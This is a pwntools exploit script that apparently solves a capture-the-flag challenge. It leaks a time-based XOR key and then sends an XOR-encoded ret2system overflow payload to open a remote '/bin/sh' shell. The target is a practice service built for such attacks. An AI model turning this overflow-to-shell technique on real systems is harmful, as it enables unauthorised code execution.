from pwn import *

target = remote("chals.texsaw.org", 3000)

# 1. Leak the time-based XOR key
target.recvuntil(b"Currently the time is: ")
target.send(b"\x00" * 100)
output = target.recv(40)
leaked_time_val = u32(output[0:4])

# 2. Re-connect to apply the key (or use it if time hasn't changed)
target.close()
target = remote("chals.texsaw.org", 3000)

# Binary addresses (PIE disabled)
system_plt = 0x080490B0
bin_sh_addr = 0x0804A018


# Function to XOR payload according to binary logic
def xor_payload(data, key_val):
    res = bytearray()
    for i in range(0, len(data), 4):
        chunk = data[i : i + 4]
        # Calculate the key for this 4-byte chunk
        key = p32((key_val + (i // 4)) & 0xFFFFFFFF)
        for j in range(len(chunk)):
            res.append(chunk[j] ^ key[j])
    return bytes(res)


# 3. Build and send the Pre-XORed payload
# 68 bytes of padding, then system(), dummy ret, then pointer to "/bin/sh"
# 在 32 位 Linux 环境下，标准的 C 语言函数调用遵循 cdecl 约定。如果这是一个合法的 call system 指令，CPU 会在跳转之前做一件事：把 call 指令的下一条指令地址 push 到 stack 上，作为 Return Address。然后紧接着才是函数的参数。
payload = b"A" * 68 + p32(system_plt) + b"EXIT" + p32(bin_sh_addr)
target.send(xor_payload(payload, leaked_time_val))

# 4. Get the shell
target.interactive()
